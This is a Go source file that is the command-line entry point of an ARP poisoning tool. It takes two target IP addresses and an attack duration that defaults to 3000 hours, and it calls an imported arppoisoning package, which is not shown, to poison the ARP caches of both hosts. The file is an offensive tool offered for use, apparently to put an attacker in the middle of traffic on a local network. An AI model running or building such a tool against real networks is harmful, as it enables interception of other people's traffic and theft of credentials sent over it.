package main

import (
	"./arppoisoning"
	"net"
	"time"
	"github.com/gotips/log"
	"os"
	"fmt"
	"flag"
)
func usage(){
	s:=`
	arppoison -ip1 192.168.56.103 -ip2 192.168.56.104 -t seconds -d
	-ip1,-ip2: the ip will be attacked
	-t how many seconds to attack，default is 3000 *3600 seconds, 3000 hour
	-d print debug message
	`
	fmt.Println(s)
	os.Exit(0)
}
var (
	ip1str string
	ip2str string
	timeout int
	debug bool
)


func init() {
	flag.StringVar(&ip1str, "ip1", "", "ip1")
	flag.StringVar(&ip2str, "ip2", "", "ip2")
	flag.BoolVar(&debug, "d", false, "print debug message")
	flag.IntVar(&timeout, "t", 3000*3600, " how many seconds to attack")
}

func main() {


	flag.Parse()
	if len(ip1str)<=0 || len(ip2str)<=0 {
		usage()
	}
	stop:=make(chan bool)
	if debug{
		log.SetLevel(log.TraceLevel)
	} else{
		log.SetLevel(log.InfoLevel)
	}
	ip1:=net.ParseIP(ip1str)
	ip2:=net.ParseIP(ip2str)
	log.Infof("start arp poisoning :%s,%s,%d",ip1,ip2,timeout)
	go  func(){
		err:=arppoisoning.ArpPoisoningWithIP(ip1,ip2,stop)
		if err!=nil{
			log.Error(err)
		}
	}()
	time.Sleep(time.Duration(int64(timeout)*int64(time.Second)))
	close(stop)
}
